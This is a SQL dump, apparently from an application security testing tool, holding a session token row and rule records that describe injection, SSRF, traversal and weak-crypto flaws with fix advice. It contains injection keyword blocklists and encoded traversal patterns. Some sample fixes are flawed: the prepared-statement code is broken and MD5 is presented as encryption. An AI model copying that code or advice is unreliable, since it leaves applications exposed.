INSERT INTO `iast_session` (`session_key`, `session_data`, `expire_date`, `user_id`) VALUES ('wx0hz217how3k4ihyyis6iq3fdd7l7i5', '.eJxVjMEOgjAQRP-lZ9MUWrqtR-98A9ndLoKaNqFwMv67kHDQ22Tem3mrAbd1GrYqyzAndVWNuvx2hPyUfID0wHwvmktel5n0oeiTVt2XJK_b6f4dTFinfe3MGIgAkoCAc8Z2puUmcvSeo7OEIKbrAD3slDxzGyw5CTi6sCdSny_QGDeE:1vNp1W:6kKf38-AaPJ8s04QamrtpssHAlm46a2xbCC2GorU4CM', '2025-12-09 17:07:46.181766', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (1, 1, 'cmd-injection', 1, 'enable', 1, '命令执行', '命令执行漏洞是指由于Web应用程序对用户提交的数据过滤不严格，导致黑客可以通过构造特殊命令字符串的方式，将数据提交至Web应用程序中，并利用该方式执行外部程序或系统命令实施攻击，非法获取数据或者网络资源等。', '1、尽量不要执行外部的应用程序或命令。\n2、使用自定义函数或函数库实现外部应用程序或命令的功能。\n3、在执行system、eval等命令执行功能的函数前，确定参数内容。\n4、使用escapeshellarg函数处理相关参数。Escapeshellarg函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“’”，双引号“””会被转义为“””，分号“;”会被转义为“;”，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。\n5、使用safe_mode_exec_dir执行可执行的文件路径。将php.ini文件中的safe_mode设置为On，然后将允许执行的文件放入一个目录中，并使用safe_mode_exec_dir指定这个可执行的文件路径。这样，在需要执行相应的外部程序时，程序必须在safe_mode_exec_dir指定的目录中才会允许执行，否则执行将失败。', 40, 'Verifies that no untrusted data is used in commands sent to the operating system.	', '命令执行漏洞是指由于Web应用程序对用户提交的数据过滤不严格，导致黑客可以通过构造特殊命令字符串的方式，将数据提交至Web应用程序中，并利用该方式执行外部程序或系统命令实施攻击，非法获取数据或者网络资源等。', NULL, '1、尽量不要执行外部的应用程序或命令。\n2、使用自定义函数或函数库实现外部应用程序或命令的功能。\n3、在执行system、eval等命令执行功能的函数前，确定参数内容。\n4、使用escapeshellarg函数处理相关参数。Escapeshellarg函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“’”，双引号“””会被转义为“””，分号“;”会被转义为“;”，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。\n5、使用safe_mode_exec_dir执行可执行的文件路径。将php.ini文件中的safe_mode设置为On，然后将允许执行的文件放入一个目录中，并使用safe_mode_exec_dir指定这个可执行的文件路径。这样，在需要执行相应的外部程序时，程序必须在safe_mode_exec_dir指定的目录中才会允许执行，否则执行将失败。', '命令执行', '命令执行', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (2, 1, 'smtp-injection', 1, 'enable', 1, 'SMTP注入', '攻击者利用IMAP / SMTP服务器上输入验证的弱点在服务器上执行命令。Web邮件服务器通常位于Internet与IMAP或SMTP邮件服务器之间。Web邮件服务器接收到用户请求，然后Web邮件服务器向后端邮件服务器查询所请求的信息，并将此响应返回给用户。在IMAP / SMTP命令注入攻击中，邮件服务器命令嵌入在发送到Web邮件服务器的部分请求中。如果Web邮件服务器未能充分清理这些请求，则当Web邮件服务器查询后端服务器时，这些命令将被发送到后端邮件服务器，然后在此处执行命令。', '1、输入数据验证 　　\n应用程序用到的所有输入数据，包括非用户直接提供的数据和应用程序内部使用的数据，都必须进行无害化处理，删掉所有可能被恶意使用的字符。在利用数据进行任何操作之前，必须进行合法性检验。如前所述，在执行一个新的IMAP/SMTP命令时，要求前面的命令必须用CRLF结束。为了确保无法注入额外的命令，您可以在将其传递给邮件服务器之前删除输入数据中的这类字符。 　　\n2、IMAP/SMTP服务器的配置 　　\n如果只有通过webmail应用程序才能访问邮件服务器的话，这些服务器必须对国际互联网是不可见的。除此之外，还要对这些服务器进一步加固，比如禁用非绝对必要得命令等等。从而使邮件服务器注射攻击的影响降低到最小程度。 　　\n3、应用程序防火墙 　　\n如果我们已经用其它的保护系统部署了一个应用程序防火墙，那么可以添加一条规则，来过滤有邮件服务器注射缺陷的参数，从而防止这些命令被注入到邮件服务器中。比如，可以将ModSecurity用作应用程序防火墙。根据前面介绍的SquirrelMail示例，可以添加如下规则： 　　`SecFilterselective \"ARG_mailbox\" \"rn\" `　　这会过滤掉参数\"mailbox\"中注入的序列。', 37, 'Verifies that untrusted data is not used in sensitive parts of a SMTP message	.', '攻击者利用IMAP / SMTP服务器上输入验证的弱点在服务器上执行命令。Web邮件服务器通常位于Internet与IMAP或SMTP邮件服务器之间。Web邮件服务器接收到用户请求，然后Web邮件服务器向后端邮件服务器查询所请求的信息，并将此响应返回给用户。在IMAP / SMTP命令注入攻击中，邮件服务器命令嵌入在发送到Web邮件服务器的部分请求中。如果Web邮件服务器未能充分清理这些请求，则当Web邮件服务器查询后端服务器时，这些命令将被发送到后端邮件服务器，然后在此处执行命令。', NULL, '1、输入数据验证 　　\n应用程序用到的所有输入数据，包括非用户直接提供的数据和应用程序内部使用的数据，都必须进行无害化处理，删掉所有可能被恶意使用的字符。在利用数据进行任何操作之前，必须进行合法性检验。如前所述，在执行一个新的IMAP/SMTP命令时，要求前面的命令必须用CRLF结束。为了确保无法注入额外的命令，您可以在将其传递给邮件服务器之前删除输入数据中的这类字符。 　　\n2、IMAP/SMTP服务器的配置 　　\n如果只有通过webmail应用程序才能访问邮件服务器的话，这些服务器必须对国际互联网是不可见的。除此之外，还要对这些服务器进一步加固，比如禁用非绝对必要得命令等等。从而使邮件服务器注射攻击的影响降低到最小程度。 　　\n3、应用程序防火墙 　　\n如果我们已经用其它的保护系统部署了一个应用程序防火墙，那么可以添加一条规则，来过滤有邮件服务器注射缺陷的参数，从而防止这些命令被注入到邮件服务器中。比如，可以将ModSecurity用作应用程序防火墙。根据前面介绍的SquirrelMail示例，可以添加如下规则： 　　`SecFilterselective \"ARG_mailbox\" \"rn\" `　　这会过滤掉参数\"mailbox\"中注入的序列。', 'SMTP注入', 'SMTP注入', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (3, 1, 'ssrf', 1, 'enable', 1, '服务器端请求伪造', 'SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造，由服务端发起请求的一个网络攻击，一般用来在外网探测或攻击内网服务，其影响效果根据服务器用的函数不同，从而造成不同的影响。', '1、过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。\n2、限制请求的端口为http常用的端口，比如，80,443,8080,8090。\n3、黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。\n4、禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。', 38, 'Verifies that untrusted actors can\'t decide which URLs the application invokes from the server side	.', '每当 Web 应用程序在未验证用户提供的 URL 的情况下获取远程资源时，就会出现 SSRF 缺陷。它允许攻击者强制应用程序将精心设计的请求发送到意想不到的目的地，即使受到防火墙、VPN 或其他类型的网络访问控制列表 (ACL) 的保护。', NULL, '1、过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。\n2、限制请求的端口为http常用的端口，比如，80,443,8080,8090。\n3、黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。\n4、禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。', '服务器端请求伪造', '服务器端请求伪造', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (4, 1, 'unsafe-xml-decode', 1, 'enable', 1, '不安全的XML Decode', '当用户输入以不安全的方式插入到服务器端XML文档或SOAP消息中时，就会XML外部实体注入漏洞。恶意用户可构造XML元自付破坏XML原本结构，从而查看应用服务器本地文件或对应用同一网络环境下的应用进行间接攻击。', '若可以尽量不使用XMLDecoder反序列化XML内容；\n若使用则尽量确保参数不可由外界输入，尽量以白名单的方式限定XML文档名且结合严格的过滤机制。', 39, 'Verifies that use of the JavaBeans XMLDecoder is not done with untrusted data.	', '当用户输入以不安全的方式插入到服务器端XML文档或SOAP消息中时，就会XML外部实体注入漏洞。恶意用户可构造XML元自付破坏XML原本结构，从而查看应用服务器本地文件或对应用同一网络环境下的应用进行间接攻击。', NULL, '若可以尽量不使用XMLDecoder反序列化XML内容；\n若使用则尽量确保参数不可由外界输入，尽量以白名单的方式限定XML文档名且结合严格的过滤机制。', '不安全的XML Decode', '不安全的XML Decode', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (5, 1, 'sql-injection', 1, 'enable', 1, 'SQL注入', '软件使用来自上游组件的外部影响的输入来构造全部或部分SQL命令，但不会中和或不正确地中和了特殊元素，这些特殊元素在将其发送到下游组件时可能会修改预期的SQL命令。', '防范SQL注入，标准方案为输入验证与参数化查询相结合。\n输入验证分为白名单和黑名单两种方式，通常在系统中是结合到一起来完成输入验证，具体实现通过正则表达式来完成。需要注意以下几方面：\n(1) 在可信系统（比如：服务器）上执行所有的数据验证。\n(2) 验证所有来自不可信数据源（比如：数据库，文件流，等）的数据。\n(3) 应当为应用程序应提供一个集中的输入验证机制和规则。\n(4) 为所有输入明确恰当的字符集，比如：UTF-8。在输入验证前，将数据按照常用字符进行编码（规范化）。如果进行关键字的验证，请先统一大小写。\n(5) 验证的不仅是参数，包含所有来自客户端的数据，包括：所有参数、URL、HTTP头信息（比如：cookie名字和数据值）。\n(6) 验证正确的数据类型、验证数据范围、验证数据长度。\n(7) 请考虑是否允许输入常见危险字符。部分常见的危险字符包括：< > \"\" \' % ( ) & +  \' \"\" 。\n(8) 特殊字符单独验证：空字节 (%00)；换行符 (%0d, %0a, \n, \n)；路径替代字符“点-点-斜杠”（../或 ..）。验证替代字符： %c0%ae%c0%ae/ (使用规范化 验证双编码或其他类型的编码攻击)。\n参考代码：\n(1) 使用特殊字符过滤程序防护SQL注入攻击：\n代码功能：对HTTP请求中的所有参数进行危险字符过滤，发现危险字符可跳转到相应的错误页面。\n```java\npublic void doFilter(ServletRequest args0,\nServletResponse args1,FilterChain chain)\nthrows IOException, ServletException {\nHttpServletRequest req=(HttpServletRequest)args0;\nHttpServletResponse res=(HttpServletResponse)args1;\n//获得所有请求参数名\nEnumeration params = req.getParameterNames();\nString sql = \"\"\"\";\nwhile (params.hasMoreElements()) {\n//得到参数名\nString name = params.nextElement().toString();\n//得到参数对应值\nString[] value = req.getParameterValues(name);\nfor (int i = 0; i < value.length; i++) {\nsql = sql + value[i];\n}\n}\n//有sql注入和XSS危险字符\nif (sqlValidate(sql)) {\nthrow new IOException(\"\"请求有非法字符：\"\"+sql);\n} else {\nchain.doFilter(args0,args1);\n}\n}\nprotected static boolean sqlValidate(String str) {\nstr = str.toLowerCase(); //统一转为小写\nString badStr = \"\"and|exec|insert|select|delete\n|update|count|union|master|truncate|char|declare\n|cast|set|fetch|varchar|sysobjects|drop\n|`|\'|\"\"|<|>|(|)|/||=|+|-|#|*|;|%\"\";\nString[] badStrs = badStr.split(\"\"|\"\");\nfor (int i = 0; i < badStrs.length; i++) {\nif (str.indexOf(badStrs[i]) >= 0) {\nreturn true; //参数中包含要过滤关键字;\n}\n}\nreturn false; //参数中不包含要过滤关键字;\n}\n```\n(2) 通过参数化查询方式进行SQL注入攻击防护：\n```java\nString sql = “select * from product where cat=’?’ and price >’?’”;\nPreparedStatement pstmt = con.prepareStatement(sql);\npstmt.setInt(1, request.getParameter(“cat”));\npstmt.setString(2, request.getParameter(“price”));\nResultSet rs = pstmt.executeQuery();\n```\n(3) 使用MyBatis技术，通过Mapper.xml文件定义SQL语句进行SQL注入攻击防护：\n```\n<mapper namespace=\"TestUser\"> //命名空间\n<select id=\"getById\" parameterType=\"java.lang.String\"\nresultMap=\"TestFlowResult\">\nselect\n<include refid=\"TestFlowColumns\" />\n```\n在编写mybatis的映射语句时，尽量采用“#{xxx}”这样的格式。若不得不使用“NULL”这样的参数，要手工地做好过滤工作，来防止sql注入攻击。\n(4) 强类型的参数化查询，即在数据库增加、查询、更新操作时，sql语句中所有输入参数统一采用#param#方式。示例如下:\n<update id=\"\"updatePtaskDetailState\"\" parameterClass=\"\"java.lang.String\"\">\nupdate ZX_PTASKDETAIL set BATCHJNLNOSTATE = \'4\' where JNLNO = #jnlNo#\n}\n(5)需要使用like语句的地方可以使用\'%\'||#param#||\'%\'或concat(concat(\'%\',#param#),\'%\')避免注入。示例如下\nselect * from ZX_PCIF where name like \'%\'||#name#||\'%\'', 41, 'Verifies that no untrusted data is used in dynamic database queries.	', '软件使用来自上游组件的外部影响的输入来构造全部或部分SQL命令，但不会中和或不正确地中和了特殊元素，这些特殊元素在将其发送到下游组件时可能会修改预期的SQL命令。', NULL, '防范SQL注入，标准方案为输入验证与参数化查询相结合。\n输入验证分为白名单和黑名单两种方式，通常在系统中是结合到一起来完成输入验证，具体实现通过正则表达式来完成。需要注意以下几方面：\n(1) 在可信系统（比如：服务器）上执行所有的数据验证。\n(2) 验证所有来自不可信数据源（比如：数据库，文件流，等）的数据。\n(3) 应当为应用程序应提供一个集中的输入验证机制和规则。\n(4) 为所有输入明确恰当的字符集，比如：UTF-8。在输入验证前，将数据按照常用字符进行编码（规范化）。如果进行关键字的验证，请先统一大小写。\n(5) 验证的不仅是参数，包含所有来自客户端的数据，包括：所有参数、URL、HTTP头信息（比如：cookie名字和数据值）。\n(6) 验证正确的数据类型、验证数据范围、验证数据长度。\n(7) 请考虑是否允许输入常见危险字符。部分常见的危险字符包括：< > \"\" \' % ( ) & +  \' \"\" 。\n(8) 特殊字符单独验证：空字节 (%00)；换行符 (%0d, %0a, \n, \n)；路径替代字符“点-点-斜杠”（../或 ..）。验证替代字符： %c0%ae%c0%ae/ (使用规范化 验证双编码或其他类型的编码攻击)。\n参考代码：\n(1) 使用特殊字符过滤程序防护SQL注入攻击：\n代码功能：对HTTP请求中的所有参数进行危险字符过滤，发现危险字符可跳转到相应的错误页面。\n```java\npublic void doFilter(ServletRequest args0,\nServletResponse args1,FilterChain chain)\nthrows IOException, ServletException {\nHttpServletRequest req=(HttpServletRequest)args0;\nHttpServletResponse res=(HttpServletResponse)args1;\n//获得所有请求参数名\nEnumeration params = req.getParameterNames();\nString sql = \"\"\"\";\nwhile (params.hasMoreElements()) {\n//得到参数名\nString name = params.nextElement().toString();\n//得到参数对应值\nString[] value = req.getParameterValues(name);\nfor (int i = 0; i < value.length; i++) {\nsql = sql + value[i];\n}\n}\n//有sql注入和XSS危险字符\nif (sqlValidate(sql)) {\nthrow new IOException(\"\"请求有非法字符：\"\"+sql);\n} else {\nchain.doFilter(args0,args1);\n}\n}\nprotected static boolean sqlValidate(String str) {\nstr = str.toLowerCase(); //统一转为小写\nString badStr = \"\"and|exec|insert|select|delete\n|update|count|union|master|truncate|char|declare\n|cast|set|fetch|varchar|sysobjects|drop\n|`|\'|\"\"|<|>|(|)|/||=|+|-|#|*|;|%\"\";\nString[] badStrs = badStr.split(\"\"|\"\");\nfor (int i = 0; i < badStrs.length; i++) {\nif (str.indexOf(badStrs[i]) >= 0) {\nreturn true; //参数中包含要过滤关键字;\n}\n}\nreturn false; //参数中不包含要过滤关键字;\n}\n```\n(2) 通过参数化查询方式进行SQL注入攻击防护：\n```java\nString sql = “select * from product where cat=’?’ and price >’?’”;\nPreparedStatement pstmt = con.prepareStatement(sql);\npstmt.setInt(1, request.getParameter(“cat”));\npstmt.setString(2, request.getParameter(“price”));\nResultSet rs = pstmt.executeQuery();\n```\n(3) 使用MyBatis技术，通过Mapper.xml文件定义SQL语句进行SQL注入攻击防护：\n```\n<mapper namespace=\"TestUser\"> //命名空间\n<select id=\"getById\" parameterType=\"java.lang.String\"\nresultMap=\"TestFlowResult\">\nselect\n<include refid=\"TestFlowColumns\" />\n```\n在编写mybatis的映射语句时，尽量采用“#{xxx}”这样的格式。若不得不使用“NULL”这样的参数，要手工地做好过滤工作，来防止sql注入攻击。\n(4) 强类型的参数化查询，即在数据库增加、查询、更新操作时，sql语句中所有输入参数统一采用#param#方式。示例如下:\n<update id=\"\"updatePtaskDetailState\"\" parameterClass=\"\"java.lang.String\"\">\nupdate ZX_PTASKDETAIL set BATCHJNLNOSTATE = \'4\' where JNLNO = #jnlNo#\n}\n(5)需要使用like语句的地方可以使用\'%\'||#param#||\'%\'或concat(concat(\'%\',#param#),\'%\')避免注入。示例如下\nselect * from ZX_PCIF where name like \'%\'||#name#||\'%\'', 'SQL注入', 'SQL注入', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (6, 1, 'ldap-injection', 1, 'enable', 1, 'LDAP注入', 'LDAP注入是指客户端发送查询请求时，输入的字符串中含有一些特殊字符，导致修改了LDAP本来的查询结构，从而使得可以访问更多的未授权数据的一种攻击方式。', '1、使用正面验证。字母数字过滤（A..Z,a..z,0..9）适合大部分 LDAP 查询。\n2、 应该过滤出或进行转义的特殊 LDAP 字符：\n[1] 在字符串开头的空格或“#”字符\n[2] 在字符串结尾的空格字符\n[3] ,（逗号）\n[4] +（加号）\n[5] \"\"（引号）\n[6] （反斜杠）\n[7] <>（尖括号）\n[8] ;（分号）\n[9] ()（括号）', 42, 'Verifies that no untrusted data is used in dynamic LDAP queries.	', 'LDAP注入是指客户端发送查询请求时，输入的字符串中含有一些特殊字符，导致修改了LDAP本来的查询结构，从而使得可以访问更多的未授权数据的一种攻击方式。', NULL, '1、使用正面验证。字母数字过滤（A..Z,a..z,0..9）适合大部分 LDAP 查询。\n2、 应该过滤出或进行转义的特殊 LDAP 字符：\n[1] 在字符串开头的空格或“#”字符\n[2] 在字符串结尾的空格字符\n[3] ,（逗号）\n[4] +（加号）\n[5] \"\"（引号）\n[6] （反斜杠）\n[7] <>（尖括号）\n[8] ;（分号）\n[9] ()（括号）', 'LDAP注入', 'LDAP注入', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (7, 1, 'xpath-injection', 1, 'enable', 1, 'XPATH注入', 'XPath注入攻击，是指利用XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的XPath 查询代码，以获得权限信息的访问权并更改这些信息。XPath注入攻击是针对Web服务应用新的攻击方法，它允许攻击者在事先不知道XPath查询相关知 识的情况下，通过XPath查询得到一个XML文档的完整内容。Xpath注入攻击本质上和SQL注入攻击是类似的，都是输入一些恶意的查询等代码字符串，从而对网站进行攻击。', '1、数据提交到服务器上端，在服务端正式处理这批数据之前，对提交数据的合法性进行验证。\n2、检查提交的数据是否包含特殊字符，对特殊字符进行编码转换或替换、删除敏感字符或字符串，如过滤[] ‘ “ and or 等全部过滤，像单双引号这类，可以对这类特殊字符进行编码转换或替换\n3、对于系统出现的错误信息，以IE错误编码信息替换，屏蔽系统本身的出错信息或者用统一的报错页面代替（如updataxml()这类）\n参数化XPath查询，将需要构建的XPath查询表达式，以变量的形式表示，变量不是可以执行的脚本。。如下代码可以通过创建保存查询的外部文件使查询参数化：\n```\n    declare variable $loginID as xs：string external；\n    declare variable $password as xs：string external；\n    //users/user[@loginid=$loginID and@password= $password]\n```\n4、通过MD5、SSL等加密算法，对于数据敏感信息和在数据传输过程中加密，即使某些非法用户通过非法手法获取数据包，看到的也是加密后的信息。 总结下就是：限制提交非法字符，对输入内容严格检查过滤，参数化XPath查询的变量。\n5、验证是否包含特定的 XPath 函数，可以过滤掉一些 XPath 函数，以提高安全性，当然了不能以牺牲用户体验或影响用户正常使用为前提。\n总结下就是：限制提交非法字符，对输入内容严格检查过滤，参数化XPath查询的变量', 43, 'Verifies that no untrusted data is used in XPath expression used to retrieve data from an XML database.	', 'XPath注入攻击，是指利用XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的XPath 查询代码，以获得权限信息的访问权并更改这些信息。XPath注入攻击是针对Web服务应用新的攻击方法，它允许攻击者在事先不知道XPath查询相关知 识的情况下，通过XPath查询得到一个XML文档的完整内容。Xpath注入攻击本质上和SQL注入攻击是类似的，都是输入一些恶意的查询等代码字符串，从而对网站进行攻击。', NULL, '1、数据提交到服务器上端，在服务端正式处理这批数据之前，对提交数据的合法性进行验证。\n2、检查提交的数据是否包含特殊字符，对特殊字符进行编码转换或替换、删除敏感字符或字符串，如过滤[] ‘ “ and or 等全部过滤，像单双引号这类，可以对这类特殊字符进行编码转换或替换\n3、对于系统出现的错误信息，以IE错误编码信息替换，屏蔽系统本身的出错信息或者用统一的报错页面代替（如updataxml()这类）\n参数化XPath查询，将需要构建的XPath查询表达式，以变量的形式表示，变量不是可以执行的脚本。。如下代码可以通过创建保存查询的外部文件使查询参数化：\n```\n    declare variable $loginID as xs：string external；\n    declare variable $password as xs：string external；\n    //users/user[@loginid=$loginID and@password= $password]\n```\n4、通过MD5、SSL等加密算法，对于数据敏感信息和在数据传输过程中加密，即使某些非法用户通过非法手法获取数据包，看到的也是加密后的信息。 总结下就是：限制提交非法字符，对输入内容严格检查过滤，参数化XPath查询的变量。\n5、验证是否包含特定的 XPath 函数，可以过滤掉一些 XPath 函数，以提高安全性，当然了不能以牺牲用户体验或影响用户正常使用为前提。\n总结下就是：限制提交非法字符，对输入内容严格检查过滤，参数化XPath查询的变量', 'XPATH注入', 'XPATH注入', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (8, 1, 'path-traversal', 1, 'enable', 1, '路径穿越', 'CWE-23，该软件使用外部输入来构建路径名，该路径名应位于受限目录内，但不能正确中和诸如“ ..”之类的序列，这些序列可以解析到该目录之外的位置。', '防止文件路径遍历漏洞的最有效方法是避免将用户提供的输入完全传递给文件系统API。\n如果认为不可避免的是将用户提供的输入传递给文件系统API，则应同时使用两层防御，以防止受到攻击：\n应用程序应在处理之前验证用户输入。理想情况下，验证应与允许值的白名单进行比较。如果所需的功能无法做到这一点，则验证应验证输入内容仅包含允许的内容，例如纯字母数字字符。\n验证提供的输入后，应用程序应将输入附加到基本目录，并使用平台文件系统API规范化路径。验证规范化路径以预期的基本目录开头。\n以下是一些简单的Java代码示例，用于根据用户输入来验证文件的规范路径：\n```java\nFile file = new File(BASE_DIRECTORY, userInput);\nif (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {\n// process file\n}\n```', 44, 'Verifies that file paths containing untrusted data are not accessed.	', 'CWE-23，该软件使用外部输入来构建路径名，该路径名应位于受限目录内，但不能正确中和诸如“ ..”之类的序列，这些序列可以解析到该目录之外的位置。', NULL, '防止文件路径遍历漏洞的最有效方法是避免将用户提供的输入完全传递给文件系统API。\n如果认为不可避免的是将用户提供的输入传递给文件系统API，则应同时使用两层防御，以防止受到攻击：\n应用程序应在处理之前验证用户输入。理想情况下，验证应与允许值的白名单进行比较。如果所需的功能无法做到这一点，则验证应验证输入内容仅包含允许的内容，例如纯字母数字字符。\n验证提供的输入后，应用程序应将输入附加到基本目录，并使用平台文件系统API规范化路径。验证规范化路径以预期的基本目录开头。\n以下是一些简单的Java代码示例，用于根据用户输入来验证文件的规范路径：\n```java\nFile file = new File(BASE_DIRECTORY, userInput);\nif (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {\n// process file\n}\n```', '路径穿越', '路径穿越', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (9, 1, 'crypto-weak-randomness', 3, 'disable', 1, '弱随机数算法', '随机数在计算机应用中使用的比较广泛，最为熟知的便是在密码学中的应用。随机数分为真随机数和伪随机数，我们程序使用的基本都是伪随机数。伪随机又分为强伪随机数和弱伪随机数。伪随机数，通过一定算法和种子得出。软件实现的是伪随机数。强伪随机数，难以预测的随机数。弱伪随机数，易于预测的随机数。\nJava程序中，使用java.util.Random获得随机数，这种随机数源于伪随机数生成器，产生的随机数容易被预测，对于安全性要求较高的环境中，使用这种随机数可能会降低系统安全性，使攻击者有机可乘。', '1、使用目前被业界专家认为较强的经过良好审核的加密PRNG算法，初始化随机数生成器时使用具有足够长度且不固定的种子。\n2、在安全性要求较高的应用中，应使用更安全的随机数生成器，如java.security.SecureRandom类。', 45, 'Verifies that weak sources of entropy are not used.', '随机数在计算机应用中使用的比较广泛，最为熟知的便是在密码学中的应用。随机数分为真随机数和伪随机数，我们程序使用的基本都是伪随机数。伪随机又分为强伪随机数和弱伪随机数。伪随机数，通过一定算法和种子得出。软件实现的是伪随机数。强伪随机数，难以预测的随机数。弱伪随机数，易于预测的随机数。\nJava程序中，使用java.util.Random获得随机数，这种随机数源于伪随机数生成器，产生的随机数容易被预测，对于安全性要求较高的环境中，使用这种随机数可能会降低系统安全性，使攻击者有机可乘。', NULL, '1、使用目前被业界专家认为较强的经过良好审核的加密PRNG算法，初始化随机数生成器时使用具有足够长度且不固定的种子。\n2、在安全性要求较高的应用中，应使用更安全的随机数生成器，如java.security.SecureRandom类。', '弱随机数算法', '弱随机数算法', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (10, 1, 'crypto-bad-mac', 3, 'disable', 1, '弱哈希算法', '哈希算法是使用哈希函数将任意长度的消息映射成为一个长度较短且长度固定的值，这个经过映射的值为哈希值。它是一种单向加密体制，即一个从明文到密文的不可逆映射，只有加密过程，没有解密过程。而不安全的哈希算法则可以逆向推出明文。在密码学中，哈希算法主要用于消息摘要和签名来对整个消息的完整性进行校验，所以需要哈希算法无法推导输入的原始值，这是哈希算法安全性的基础。目前常用的哈希算法包括MD4、MD5、SHA等。本篇文章以JAVA语言源代码为例，分析不安全的哈希算法缺陷产生的原因以及修复方法。详细请参见：CWE ID 327: Use of a Broken or Risky Cryptographic Algorithm (http://cwe.mitre.org/data/definitions/327.html)。', '库或框架当需要存储或传输敏感数据时，请使用强大的最新加密算法来加密该数据。选择目前被该领域专家认为强大的经过充分审查的算法，并使用经过充分测试的实现。与所有加密机制一样，源代码应该可供分析。', 46, 'Verifies that only strong hash algorithms are used.', '哈希算法是使用哈希函数将任意长度的消息映射成为一个长度较短且长度固定的值，这个经过映射的值为哈希值。它是一种单向加密体制，即一个从明文到密文的不可逆映射，只有加密过程，没有解密过程。而不安全的哈希算法则可以逆向推出明文。在密码学中，哈希算法主要用于消息摘要和签名来对整个消息的完整性进行校验，所以需要哈希算法无法推导输入的原始值，这是哈希算法安全性的基础。目前常用的哈希算法包括MD4、MD5、SHA等。本篇文章以JAVA语言源代码为例，分析不安全的哈希算法缺陷产生的原因以及修复方法。详细请参见：CWE ID 327: Use of a Broken or Risky Cryptographic Algorithm (http://cwe.mitre.org/data/definitions/327.html)。', NULL, '库或框架当需要存储或传输敏感数据时，请使用强大的最新加密算法来加密该数据。选择目前被该领域专家认为强大的经过充分审查的算法，并使用经过充分测试的实现。与所有加密机制一样，源代码应该可供分析。', '弱哈希算法', '弱哈希算法', 1);
